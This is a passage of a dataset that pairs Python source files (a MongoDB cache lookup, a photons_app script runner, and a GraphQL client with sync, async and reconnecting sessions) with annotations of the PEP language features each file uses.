stream:\n\t\t\t\t\tself.Cache.clear()\n\t\texcept asyncio.CancelledError:\n\t\t\treturn\n\t\texcept Exception as e:\n\t\t\tL.exception(f\"Observed exception: {e}\")\n\t\t\tawait asyncio.sleep(5)\n\tasync def get(self, key):\n\t\ttry:\n\t\t\tvalue = self.Cache[key]\n\t\t\tself.CacheCounter.add('hit', 1)\n\t\texcept KeyError:\n\t\t\tquery = self.build_query(key)\n\t\t\tvalue = await self._find_one(query)\n\t\t\tif value is not None:\n\t\t\t\tself.Cache[key] = value\n\t\t\t\tself.CacheCounter.add('miss', 1)\n\t\tif value is None:\n\t\t\tself.SuccessCounter.add('miss', 1)\n\t\telse:\n\t\t\tself.SuccessCounter.add('hit', 1)\n\t\treturn value\n\tasync def _count(self, database):\n\t\treturn await database[self.Collection].count_documents({})\n\tasync def load(self):\n\t\treturn True\n\tdef __len__(self):\n\t\treturn self.Count\n\tdef __getitem__(self, key):\n\t\traise NotImplementedError()\n\tdef __iter__(self):\n\t\tdatabase = self.Connection.Client[self.Database].delegate\n\t\tself.Iterator = database[self.Collection].find()\n\t\treturn self\n\tdef __next__(self):\n\t\telement = self.Iterator.next()\n\t\tkey = element.get(self.Key)\n\t\tif key is not None:\n\t\t\tself.Cache[key] = element\n\t\treturn key",
            "patterns": {
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        73,
                        74,
                        "async for",
                        "async for change in stream:\n\t\t\t\t\tself.Cache.clear()"
                    ]
                ],
                "pep_498": [
                    [
                        78,
                        "\t\t\tL.exception(f\"Observed exception: {e}\")"
                    ]
                ]
            }
        },
        "128": {
            "file": "from photons_app.errors import RunErrors, BadRunWithResults\nfrom photons_app import helpers as hp\nfrom delfick_project.norms import sb\nimport traceback\nimport asyncio\nimport sys\n@hp.asynccontextmanager\nasync def sender_wrapper(target, sender=sb.NotSpecified, kwargs=None):\n    owns_sender = sender is sb.NotSpecified\n    try:\n        if owns_sender:\n            sender = await target.make_sender()\n        if kwargs is not None:\n            if \"limit\" not in kwargs:\n                kwargs[\"limit\"] = 30\n            if kwargs[\"limit\"] is not None and not hasattr(kwargs[\"limit\"], \"acquire\"):\n                kwargs[\"limit\"] = asyncio.Semaphore(kwargs[\"limit\"])\n        yield sender\n    finally:\n        if owns_sender:\n            await target.close_sender(sender)\nclass ScriptRunner:\n    def __init__(self, script, target):\n        self.script = script\n        self.target = target\n    async def run_all(self, *args, **kwargs):\n        results = []\n        try:\n            async for info in self.run(*args, **kwargs):\n                results.append(info)\n        except asyncio.CancelledError:\n            raise\n        except RunErrors as error:\n            raise BadRunWithResults(results=results, _errors=error.errors)\n        except Exception as error:\n            raise BadRunWithResults(results=results, _errors=[error])\n        else:\n            return results\n    run_with_all = run_all\n    async def run(self, reference, sender=sb.NotSpecified, **kwargs):\n        if self.script is None:\n            return\n        async with sender_wrapper(self.target, sender, kwargs) as sender:\n            gen = self.script.run(reference, sender, **kwargs)\n            try:\n                async for nxt in gen:\n                    yield nxt\n            finally:\n                exc = sys.exc_info()[1]\n                if exc:\n                    traceback.clear_frames(exc.__traceback__)\n                await hp.stop_async_generator(gen, exc=exc)\n    run_with = run",
            "patterns": {
                "pep_468": [
                    [
                        29,
                        "self.run(*args, **kwargs)"
                    ],
                    [
                        44,
                        "self.script.run(reference, sender, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        8,
                        21,
                        "async generator",
                        "async def sender_wrapper(target, sender=sb.NotSpecified, kwargs=None):\n    owns_sender = sender is sb.NotSpecified\n    try:\n        if owns_sender:\n            sender = await target.make_sender()\n        if kwargs is not None:\n            if \"limit\" not in kwargs:\n                kwargs[\"limit\"] = 30\n            if kwargs[\"limit\"] is not None and not hasattr(kwargs[\"limit\"], \"acquire\"):\n                kwargs[\"limit\"] = asyncio.Semaphore(kwargs[\"limit\"])\n        yield sender\n    finally:\n        if owns_sender:\n            await target.close_sender(sender)"
                    ],
                    [
                        40,
                        52,
                        "async generator",
                        "async def run(self, reference, sender=sb.NotSpecified, **kwargs):\n        if self.script is None:\n            return\n        async with sender_wrapper(self.target, sender, kwargs) as sender:\n            gen = self.script.run(reference, sender, **kwargs)\n            try:\n                async for nxt in gen:\n                    yield nxt\n            finally:\n                exc = sys.exc_info()[1]\n                if exc:\n                    traceback.clear_frames(exc.__traceback__)\n                await hp.stop_async_generator(gen, exc=exc)"
                    ],
                    [
                        29,
                        30,
                        "async for",
                        "async for info in self.run(*args, **kwargs):\n                results.append(info)"
                    ],
                    [
                        46,
                        47,
                        "async for",
                        "async for nxt in gen:\n                    yield nxt"
                    ]
                ]
            }
        },
        "129": {
            "file": "import asyncio\nimport logging\nimport sys\nimport warnings\nfrom typing import (\n    Any,\n    AsyncGenerator,\n    Callable,\n    Dict,\n    Generator,\n    Optional,\n    TypeVar,\n    Union,\n    cast,\n    overload,\n)\nimport backoff\nfrom graphql import (\n    DocumentNode,\n    ExecutionResult,\n    GraphQLSchema,\n    IntrospectionQuery,\n    build_ast_schema,\n    get_introspection_query,\n    parse,\n    validate,\n)\nfrom .transport.async_transport import AsyncTransport\nfrom .transport.exceptions import TransportClosed, TransportQueryError\nfrom .transport.local_schema import LocalSchemaTransport\nfrom .transport.transport import Transport\nfrom .utilities import build_client_schema\nfrom .utilities import parse_result as parse_result_fn\nfrom .utilities import serialize_variable_values\nfrom .utils import str_first_element\nif sys.version_info[:2] >= (3, 8):\n    from typing import Literal\nelse:\n    from typing_extensions import Literal  \nlog = logging.getLogger(__name__)\nclass Client:\n    def __init__(\n        self,\n        schema: Optional[Union[str, GraphQLSchema]] = None,\n        introspection: Optional[IntrospectionQuery] = None,\n        transport: Optional[Union[Transport, AsyncTransport]] = None,\n        fetch_schema_from_transport: bool = False,\n        introspection_args: Optional[Dict] = None,\n        execute_timeout: Optional[Union[int, float]] = 10,\n        serialize_variables: bool = False,\n        parse_results: bool = False,\n    ):\n        if introspection:\n            assert (\n                not schema\n            ), \"Cannot provide introspection and schema at the same time.\"\n            schema = build_client_schema(introspection)\n        if isinstance(schema, str):\n            type_def_ast = parse(schema)\n            schema = build_ast_schema(type_def_ast)\n        if transport and fetch_schema_from_transport:\n            assert (\n                not schema\n            ), \"Cannot fetch the schema from transport if is already provided.\"\n            assert not type(transport).__name__ == \"AppSyncWebsocketsTransport\", (\n                \"fetch_schema_from_transport=True is not allowed \"\n                \"for AppSyncWebsocketsTransport \"\n                \"because only subscriptions are allowed on the realtime endpoint.\"\n            )\n        if schema and not transport:\n            transport = LocalSchemaTransport(schema)\n        self.schema: Optional[GraphQLSchema] = schema\n        self.introspection: Optional[IntrospectionQuery] = introspection\n        self.transport: Optional[Union[Transport, AsyncTransport]] = transport\n        self.fetch_schema_from_transport: bool = fetch_schema_from_transport\n        self.introspection_args = (\n            {} if introspection_args is None else introspection_args\n        )\n        self.execute_timeout = execute_timeout\n        self.serialize_variables = serialize_variables\n        self.parse_results = parse_results\n    def validate(self, document: DocumentNode):\n        assert (\n            self.schema\n        ), \"Cannot validate the document locally, you need to pass a schema.\"\n        validation_errors = validate(self.schema, document)\n        if validation_errors:\n            raise validation_errors[0]\n    def _build_schema_from_introspection(self, execution_result: ExecutionResult):\n        if execution_result.errors:\n            raise TransportQueryError(\n                (\n                    \"Error while fetching schema: \"\n                    f\"{str_first_element(execution_result.errors)}\\n\"\n                    \"If you don't need the schema, you can try with: \"\n                    '\"fetch_schema_from_transport=False\"'\n                ),\n                errors=execution_result.errors,\n                data=execution_result.data,\n                extensions=execution_result.extensions,\n            )\n        self.introspection = cast(IntrospectionQuery, execution_result.data)\n        self.schema = build_client_schema(self.introspection)\n    @overload\n    def execute_sync(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,  \n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> Dict[str, Any]:\n        ...  \n    @overload\n    def execute_sync(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> ExecutionResult:\n        ...  \n    @overload\n    def execute_sync(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        ...  \n    def execute_sync(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        with self as session:\n            return session.execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )\n    @overload\n    async def execute_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,  \n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> Dict[str, Any]:\n        ...  \n    @overload\n    async def execute_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> ExecutionResult:\n        ...  \n    @overload\n    async def execute_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        ...  \n    async def execute_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        async with self as session:\n            return await session.execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )\n    @overload\n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,  \n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> Dict[str, Any]:\n        ...  \n    @overload\n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> ExecutionResult:\n        ...  \n    @overload\n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        ...  \n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        if isinstance(self.transport, AsyncTransport):\n            try:\n                with warnings.catch_warnings():\n                    warnings.filterwarnings(\n                        \"ignore\", message=\"There is no current event loop\"\n                    )\n                    loop = asyncio.get_event_loop()\n            except RuntimeError:\n                loop = asyncio.new_event_loop()\n                asyncio.set_event_loop(loop)\n            assert not loop.is_running(), (\n                \"Cannot run client.execute(query) if an asyncio loop is running.\"\n                \" Use 'await client.execute_async(query)' instead.\"\n            )\n            data = loop.run_until_complete(\n                self.execute_async(\n                    document,\n                    variable_values=variable_values,\n                    operation_name=operation_name,\n                    serialize_variables=serialize_variables,\n                    parse_result=parse_result,\n                    get_execution_result=get_execution_result,\n                    **kwargs,\n                )\n            )\n            return data\n        else:  \n            return self.execute_sync(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )\n    @overload\n    def subscribe_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> AsyncGenerator[Dict[str, Any], None]:\n        ...  \n    @overload\n    def subscribe_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> AsyncGenerator[ExecutionResult, None]:\n        ...  \n    @overload\n    def subscribe_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[\n        AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n    ]:\n        ...  \n    async def subscribe_async(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[\n        AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n    ]:\n        async with self as session:\n            generator = session.subscribe(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                serialize_variables=serialize_variables,\n                parse_result=parse_result,\n                get_execution_result=get_execution_result,\n                **kwargs,\n            )\n            async for result in generator:\n                yield result\n    @overload\n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> Generator[Dict[str, Any], None, None]:\n        ...  \n    @overload\n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> Generator[ExecutionResult, None, None]:\n        ...  \n    @overload\n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[\n        Generator[Dict[str, Any], None, None], Generator[ExecutionResult, None, None]\n    ]:\n        ...  \n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        *,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[\n        Generator[Dict[str, Any], None, None], Generator[ExecutionResult, None, None]\n    ]:\n        try:\n            with warnings.catch_warnings():\n                warnings.filterwarnings(\n                    \"ignore\", message=\"There is no current event loop\"\n                )\n                loop = asyncio.get_event_loop()\n        except RuntimeError:\n            loop = asyncio.new_event_loop()\n            asyncio.set_event_loop(loop)\n        async_generator: Union[\n            AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n        ] = self.subscribe_async(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            get_execution_result=get_execution_result,\n            **kwargs,\n        )\n        assert not loop.is_running(), (\n            \"Cannot run client.subscribe(query) if an asyncio loop is running.\"\n            \" Use 'await client.subscribe_async(query)' instead.\"\n        )\n        try:\n            while True:\n                generator_task = asyncio.ensure_future(\n                    async_generator.__anext__(), loop=loop\n                )\n                result: Union[\n                    Dict[str, Any], ExecutionResult\n                ] = loop.run_until_complete(\n                    generator_task\n                )  \n                yield result\n        except StopAsyncIteration:\n            pass\n        except (KeyboardInterrupt, Exception, GeneratorExit):\n            asyncio.ensure_future(async_generator.aclose(), loop=loop)\n            generator_task.cancel()\n            loop.run_until_complete(loop.shutdown_asyncgens())\n            raise\n    async def connect_async(self, reconnecting=False, **kwargs):\n        r\n        assert isinstance(\n            self.transport, AsyncTransport\n        ), \"Only a transport of type AsyncTransport can be used asynchronously\"\n        if reconnecting:\n            self.session = ReconnectingAsyncClientSession(client=self, **kwargs)\n            await self.session.start_connecting_task()\n        else:\n            await self.transport.connect()\n            self.session = AsyncClientSession(client=self)\n        try:\n            if self.fetch_schema_from_transport and not self.schema:\n                await self.session.fetch_schema()\n        except Exception:\n            await self.transport.close()\n            raise\n        return self.session\n    async def close_async(self):\n        if isinstance(self.session, ReconnectingAsyncClientSession):\n            await self.session.stop_connecting_task()\n        await self.transport.close()\n    async def __aenter__(self):\n        return await self.connect_async()\n    async def __aexit__(self, exc_type, exc, tb):\n        await self.close_async()\n    def connect_sync(self):\n        r\n        assert not isinstance(self.transport, AsyncTransport), (\n            \"Only a sync transport can be used.\"\n            \" Use 'async with Client(...) as session:' instead\"\n        )\n        self.transport.connect()\n        if not hasattr(self, \"session\"):\n            self.session = SyncClientSession(client=self)\n        try:\n            if self.fetch_schema_from_transport and not self.schema:\n                self.session.fetch_schema()\n        except Exception:\n            self.transport.close()\n            raise\n        return self.session\n    def close_sync(self):\n        self.transport.close()\n    def __enter__(self):\n        return self.connect_sync()\n    def __exit__(self, *args):\n        self.close_sync()\nclass SyncClientSession:\n    def __init__(self, client: Client):\n        self.client = client\n    def _execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> ExecutionResult:\n        if self.client.schema:\n            self.client.validate(document)\n            if variable_values is not None:\n                if serialize_variables or (\n                    serialize_variables is None and self.client.serialize_variables\n                ):\n                    variable_values = serialize_variable_values(\n                        self.client.schema,\n                        document,\n                        variable_values,\n                        operation_name=operation_name,\n                    )\n        result = self.transport.execute(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            **kwargs,\n        )\n        if self.client.schema:\n            if parse_result or (parse_result is None and self.client.parse_results):\n                result.data = parse_result_fn(\n                    self.client.schema,\n                    document,\n                    result.data,\n                    operation_name=operation_name,\n                )\n        return result\n    @overload\n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> Dict[str, Any]:\n        ...  \n    @overload\n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> ExecutionResult:\n        ...  \n    @overload\n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        ...  \n    def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        result = self._execute(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n        if result.errors:\n            raise TransportQueryError(\n                str_first_element(result.errors),\n                errors=result.errors,\n                data=result.data,\n                extensions=result.extensions,\n            )\n        assert (\n            result.data is not None\n        ), \"Transport returned an ExecutionResult without data or errors\"\n        if get_execution_result:\n            return result\n        return result.data\n    def fetch_schema(self) -> None:\n        introspection_query = get_introspection_query(**self.client.introspection_args)\n        execution_result = self.transport.execute(parse(introspection_query))\n        self.client._build_schema_from_introspection(execution_result)\n    @property\n    def transport(self):\n        return self.client.transport\nclass AsyncClientSession:\n    def __init__(self, client: Client):\n        self.client = client\n    async def _subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> AsyncGenerator[ExecutionResult, None]:\n        if self.client.schema:\n            self.client.validate(document)\n            if variable_values is not None:\n                if serialize_variables or (\n                    serialize_variables is None and self.client.serialize_variables\n                ):\n                    variable_values = serialize_variable_values(\n                        self.client.schema,\n                        document,\n                        variable_values,\n                        operation_name=operation_name,\n                    )\n        inner_generator: AsyncGenerator[\n            ExecutionResult, None\n        ] = self.transport.subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            **kwargs,\n        )\n        self._generator = inner_generator\n        try:\n            async for result in inner_generator:\n                if self.client.schema:\n                    if parse_result or (\n                        parse_result is None and self.client.parse_results\n                    ):\n                        result.data = parse_result_fn(\n                            self.client.schema,\n                            document,\n                            result.data,\n                            operation_name=operation_name,\n                        )\n                yield result\n        finally:\n            await inner_generator.aclose()\n    @overload\n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> AsyncGenerator[Dict[str, Any], None]:\n        ...  \n    @overload\n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> AsyncGenerator[ExecutionResult, None]:\n        ...  \n    @overload\n    def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[\n        AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n    ]:\n        ...  \n    async def subscribe(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[\n        AsyncGenerator[Dict[str, Any], None], AsyncGenerator[ExecutionResult, None]\n    ]:\n        inner_generator: AsyncGenerator[ExecutionResult, None] = self._subscribe(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n        try:\n            async for result in inner_generator:\n                if result.errors:\n                    raise TransportQueryError(\n                        str_first_element(result.errors),\n                        errors=result.errors,\n                        data=result.data,\n                        extensions=result.extensions,\n                    )\n                elif result.data is not None:\n                    if get_execution_result:\n                        yield result\n                    else:\n                        yield result.data\n        finally:\n            await inner_generator.aclose()\n    async def _execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> ExecutionResult:\n        if self.client.schema:\n            self.client.validate(document)\n            if variable_values is not None:\n                if serialize_variables or (\n                    serialize_variables is None and self.client.serialize_variables\n                ):\n                    variable_values = serialize_variable_values(\n                        self.client.schema,\n                        document,\n                        variable_values,\n                        operation_name=operation_name,\n                    )\n        result = await asyncio.wait_for(\n            self.transport.execute(\n                document,\n                variable_values=variable_values,\n                operation_name=operation_name,\n                **kwargs,\n            ),\n            self.client.execute_timeout,\n        )\n        if self.client.schema:\n            if parse_result or (parse_result is None and self.client.parse_results):\n                result.data = parse_result_fn(\n                    self.client.schema,\n                    document,\n                    result.data,\n                    operation_name=operation_name,\n                )\n        return result\n    @overload\n    async def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[False] = ...,\n        **kwargs,\n    ) -> Dict[str, Any]:\n        ...  \n    @overload\n    async def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: Literal[True],\n        **kwargs,\n    ) -> ExecutionResult:\n        ...  \n    @overload\n    async def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = ...,\n        operation_name: Optional[str] = ...,\n        serialize_variables: Optional[bool] = ...,\n        parse_result: Optional[bool] = ...,\n        *,\n        get_execution_result: bool,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        ...  \n    async def execute(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        get_execution_result: bool = False,\n        **kwargs,\n    ) -> Union[Dict[str, Any], ExecutionResult]:\n        result = await self._execute(\n            document,\n            variable_values=variable_values,\n            operation_name=operation_name,\n            serialize_variables=serialize_variables,\n            parse_result=parse_result,\n            **kwargs,\n        )\n        if result.errors:\n            raise TransportQueryError(\n                str_first_element(result.errors),\n                errors=result.errors,\n                data=result.data,\n                extensions=result.extensions,\n            )\n        assert (\n            result.data is not None\n        ), \"Transport returned an ExecutionResult without data or errors\"\n        if get_execution_result:\n            return result\n        return result.data\n    async def fetch_schema(self) -> None:\n        introspection_query = get_introspection_query(**self.client.introspection_args)\n        execution_result = await self.transport.execute(parse(introspection_query))\n        self.client._build_schema_from_introspection(execution_result)\n    @property\n    def transport(self):\n        return self.client.transport\n_CallableT = TypeVar(\"_CallableT\", bound=Callable[..., Any])\n_Decorator = Callable[[_CallableT], _CallableT]\nclass ReconnectingAsyncClientSession(AsyncClientSession):\n    def __init__(\n        self,\n        client: Client,\n        retry_connect: Union[bool, _Decorator] = True,\n        retry_execute: Union[bool, _Decorator] = True,\n    ):\n        self.client = client\n        self._connect_task = None\n        self._reconnect_request_event = asyncio.Event()\n        self._connected_event = asyncio.Event()\n        if retry_connect is True:\n            self.retry_connect = backoff.on_exception(\n                backoff.expo,\n                Exception,\n                max_value=60,\n            )\n        elif retry_connect is False:\n            self.retry_connect = lambda e: e\n        else:\n            assert callable(retry_connect)\n            self.retry_connect = retry_connect\n        if retry_execute is True:\n            self.retry_execute = backoff.on_exception(\n                backoff.expo,\n                Exception,\n                max_tries=5,\n                giveup=lambda e: isinstance(e, TransportQueryError),\n            )\n        elif retry_execute is False:\n            self.retry_execute = lambda e: e\n        else:\n            assert callable(retry_execute)\n            self.retry_execute = retry_execute\n        self._execute_with_retries = self.retry_execute(self._execute_once)\n        self._connect_with_retries = self.retry_connect(self.transport.connect)\n    async def _connection_loop(self):\n        while True:\n            await self._connect_with_retries()\n            self._connected_event.set()\n            self._connected_event.clear()\n            self._reconnect_request_event.clear()\n            await self._reconnect_request_event.wait()\n    async def start_connecting_task(self):\n        if self._connect_task:\n            log.warning(\"connect task already started!\")\n        else:\n            self._connect_task = asyncio.ensure_future(self._connection_loop())\n            await self._connected_event.wait()\n    async def stop_connecting_task(self):\n        if self._connect_task is not None:\n            self._connect_task.cancel()\n            self._connect_task = None\n    async def _execute_once(\n        self,\n        document: DocumentNode,\n        variable_values: Optional[Dict[str, Any]] = None,\n        operation_name: Optional[str] = None,\n        serialize_variables: Optional[bool] = None,\n        parse_result: Optional[bool] = None,\n        **kwargs,\n    ) -> 